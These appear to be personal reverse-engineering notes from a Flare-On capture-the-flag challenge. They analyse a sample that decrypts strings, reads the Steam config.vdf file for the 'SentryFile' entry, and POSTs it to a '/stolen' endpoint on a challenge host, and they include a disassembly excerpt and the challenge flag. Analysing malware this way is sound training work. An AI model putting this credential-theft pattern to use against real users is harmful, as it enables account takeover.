

decrypts strings with this key:

0x1337+2+0x616E6162+0x32B840F



0x6499f8a9 is correct?
0x6499f8aa - weird




bananabot 5000
http://127.0.0.1:57328/2/summary
the decryption of this blob was successful



CloseHandle
CreateFileA
ExitProcess
GetFileSize
GetProcessHeap
ReadFile


28:0000000000371772 ; context stru_371772
debug028:0000000000371772 stru_371772 context <2BA8h, 371883h, offset kernel32_CloseHandle, \
debug028:0000000000371772                                         ; DATA XREF: sub_37097D+42↑o
debug028:0000000000371772                                         ; sub_371465+20D↑o ...
debug028:0000000000371772          offset kernel32_CreateFileA, offset kernel32_ExitProcess, \ ; "NTDLL.RtlExitUserProcess"
debug028:0000000000371772          offset kernel32_FindClose, offset kernel32_FindFirstFileA, \
debug028:0000000000371772          offset kernel32_FindNextFileA, offset kernel32_GetFileSize>
debug028:00000000003717BA dq offset kernel32_GetProcessHeap
debug028:00000000003717C2 dq offset kernel32_ReadFile
debug028:00000000003717CA dq offset kernel32_CopyFileA
debug028:00000000003717D2 dq offset kernel32_ExpandEnvironmentStringsA
debug028:00000000003717DA off_3717DA dq offset sub_76FFDC60       ; DATA XREF: sub_37097D+1F↑o
debug028:00000000003717DA                           



Opens C:\Program Files (x86)\Steam\config\config.vdf
reads it
finds "SentryFile"


HINTERNET HttpOpenRequestA(
  [in] HINTERNET hConnect,
  [in] LPCSTR    lpszVerb,
  [in] LPCSTR    lpszObjectName,
  [in] LPCSTR    lpszVersion,
  [in] LPCSTR    lpszReferrer,
  [in] LPCSTR    *lplpszAcceptTypes,
  [in] DWORD     dwFlags,
  [in] DWORD_PTR dwContext
);

bighackies.flare-on.com
HttpOpenRequestA(..., "POST", "/stolen", )
Content-Type: application/octet-stream





35FD - flag
30FB - net shit




2A58C0


computer_ass1sted_ctfing@flare-on.com



